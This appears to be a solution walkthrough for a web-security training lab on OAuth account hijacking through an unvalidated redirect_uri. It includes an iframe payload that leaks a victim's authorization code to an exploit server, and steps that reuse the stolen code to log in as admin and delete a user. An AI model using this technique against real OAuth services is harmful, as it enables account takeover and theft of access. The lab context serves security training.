You can log in with your own social media account using the following credentials: `wiener:peter`.

`<iframe src="https://oauth-0abc004303cc63d280136022028d0026.oauth-server.net/auth?client_id=l3cw3z4i0vood8pswv7pq&redirect_uri=https://0a7600b2034b635b8093626a007600f8.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>`

Solution:

1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Log out and then log back in again. Observe that you are logged in instantly this time. As you still had an active session with the OAuth service, you didn't need to enter your credentials again to authenticate yourself.
3. In Burp, study the OAuth flow in the proxy history and identify the **most recent** authorization request. This should start with `GET /auth?client_id=[...]`. Notice that when this request is sent, you are immediately redirected to the `redirect_uri` along with the authorization code in the query string. Send this authorization request to Burp Repeater.
4. In Burp Repeater, observe that you can submit any arbitrary value as the `redirect_uri` without encountering an error. Notice that your input is used to generate the redirect in the response.
5. Change the `redirect_uri` to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.
6. Go back to the exploit server and create the following `iframe` at `/exploit`:
    
    `<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
7. Store the exploit and click "View exploit". Check that your `iframe` loads and then check the exploit server's access log. If everything is working correctly, you should see another request with a leaked code.
8. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
9. Log out of the blog website and then use the stolen code to navigate to:
    
    `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`
    
    The rest of the OAuth flow will be completed automatically and you will be logged in as the admin user. Open the admin panel and delete `carlos` to solve the lab.